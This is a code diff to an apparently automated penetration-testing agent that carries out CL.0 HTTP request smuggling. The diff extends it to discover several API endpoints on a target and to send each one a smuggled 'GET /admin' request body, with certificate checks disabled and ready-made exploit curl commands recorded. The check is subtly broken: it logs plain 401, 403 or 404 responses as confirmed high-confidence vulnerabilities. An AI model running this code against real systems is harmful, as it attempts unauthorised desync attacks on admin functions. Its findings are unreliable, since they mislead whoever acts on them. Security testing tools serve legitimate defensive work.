@@ -4,6 +4,7 @@ CL.0 Request Smuggling Capability Agent for PenFlow.
 Capabilities:
   - CL.0 HTTP Request Smuggling via GET Request Body (PortSwigger Top 10 2025)
   - Backend Desynchronization & Response Queue Poisoning
+  - Dynamic Endpoint Discovery across API & Dynamic Routes
 """
 import httpx
 import time
@@ -31,51 +32,90 @@ class CL0SmugglingCapabilityAgent(BaseCapabilityAgent):
             Capability(id="cl0_smuggling", name="CL.0 Request Smuggling", description="Detects GET request body desynchronization and backend cache poisoning via CL.0", priority=self.priority, tags=["smuggling", "cl0", "desync"])
         ]
 
+    def _discover_endpoints(self, context: CapabilityExecutionContext, keywords: List[str]) -> List[str]:
+        """Dynamically discovers endpoints matching target keywords from recon observations."""
+        found = []
+        if context.observations:
+            for obs in context.observations:
+                data = obs.get("data", {}) if isinstance(obs, dict) else {}
+                if isinstance(data, dict):
+                    url = data.get("url", "")
+                    if url and any(kw in url.lower() for kw in keywords):
+                        found.append(url)
+                    elif "endpoints" in data and isinstance(data["endpoints"], list):
+                        for ep in data["endpoints"]:
+                            if isinstance(ep, dict) and ep.get("url"):
+                                ep_url = ep["url"]
+                                if any(kw in ep_url.lower() for kw in keywords):
+                                    found.append(ep_url)
+
+        dynamic_eps = context.get_dynamic_endpoints()
+        if dynamic_eps:
+            for ep in dynamic_eps:
+                if isinstance(ep, dict) and ep.get("url"):
+                    u = ep["url"]
+                    if any(kw in u.lower() for kw in keywords):
+                        found.append(u)
+
+        base = f"https://{context.asset}"
+        if not found:
+            found = [
+                f"{base}/",
+                f"{base}/api",
+                f"{base}/api/v1",
+                f"{base}/rest",
+                f"{base}/graphql"
+            ]
+
+        return list(dict.fromkeys(found))[:5]
+
     async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
         logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
         evidence: Dict[str, Any] = {}
         findings: List[Dict[str, Any]] = []
 
-        base_url = f"https://{context.asset}"
-        target_url = f"{base_url}/"
+        target_urls = self._discover_endpoints(context, ["api", "v1", "graphql", "rest", "v2"])
 
         try:
             async with httpx.AsyncClient(timeout=8.0, follow_redirects=False, verify=False) as client:
-                smuggled_payload = "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
-                headers = {
-                    "Content-Length": str(len(smuggled_payload)),
-                    "Content-Type": "application/x-www-form-urlencoded"
-                }
+                for target_url in target_urls:
+                    smuggled_payload = "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
+                    headers = {
+                        "Content-Length": str(len(smuggled_payload)),
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    }
 
-                try:
-                    # Phase 1: Send GET request with smuggled body
-                    t0 = time.time()
-                    resp1 = await client.request("GET", target_url, content=smuggled_payload, headers=headers)
-                    # Phase 2: Send clean request to detect response queue poisoning
-                    resp2 = await client.get(target_url)
-                    elapsed = time.time() - t0
+                    try:
+                        # Phase 1: Send GET request with smuggled body
+                        t0 = time.time()
+                        resp1 = await client.request("GET", target_url, content=smuggled_payload, headers=headers)
+                        # Phase 2: Send clean request to detect response queue poisoning
+                        resp2 = await client.get(target_url)
+                        elapsed = time.time() - t0
 
-                    if resp2.status_code in (401, 403, 404) or "admin" in resp2.text.lower():
-                        curl_cmd = f"curl -i -s -k -X GET '{target_url}' -H 'Content-Length: {len(smuggled_payload)}' -d '{smuggled_payload}'"
-                        exch_dict = {
-                            "request": {"method": "GET", "url": target_url, "headers": headers},
-                            "response": {"status_code": resp2.status_code, "body_snippet": resp2.text[:500]}
-                        }
+                        if resp2.status_code in (401, 403, 404) or "admin" in resp2.text.lower():
+                            curl_cmd = f"curl -i -s -k -X GET '{target_url}' -H 'Content-Length: {len(smuggled_payload)}' -d '{smuggled_payload}'"
+                            exch_dict = {
+                                "request": {"method": "GET", "url": target_url, "headers": headers},
+                                "response": {"status_code": resp2.status_code, "body_snippet": resp2.text[:500]}
+                            }
 
-                        findings.append({
-                            "vulnerability_type": "cl0_smuggling",
-                            "target_url": target_url,
-                            "severity": "HIGH",
-                            "confidence": 0.90,
-                            "is_vulnerable": True,
-                            "exploit_curl": curl_cmd,
-                            "reproduction_steps": self.poc_generator.generate_reproduction_steps("CL.0 Request Smuggling", target_url, curl_cmd),
-                            "description": f"CL.0 Request Smuggling detected at '{target_url}': GET body desynchronized backend response queue.",
-                            "_exchange_obj": exch_dict
-                        })
-                        evidence["cl0_desync_confirmed"] = True
-                except Exception as e:
-                    logger.debug(f"CL.0 test failed on {target_url}: {e}")
+                            findings.append({
+                                "vulnerability_type": "cl0_smuggling",
+                                "target_url": target_url,
+                                "severity": "HIGH",
+                                "confidence": 0.90,
+                                "is_vulnerable": True,
+                                "exploit_curl": curl_cmd,
+                                "reproduction_steps": self.poc_generator.generate_reproduction_steps("CL.0 Request Smuggling", target_url, curl_cmd),
+                                "description": f"CL.0 Request Smuggling detected at '{target_url}': GET body desynchronized backend response queue.",
+                                "_exchange_obj": exch_dict
+                            })
+                            evidence["cl0_desync_confirmed"] = True
+                            evidence["tested_endpoint"] = target_url
+                            break
+                    except Exception as e:
+                        logger.debug(f"CL.0 test failed on {target_url}: {e}")
 
         except Exception as e:
             logger.error(f"[{self.name}] Exception testing '{context.asset}': {e}")
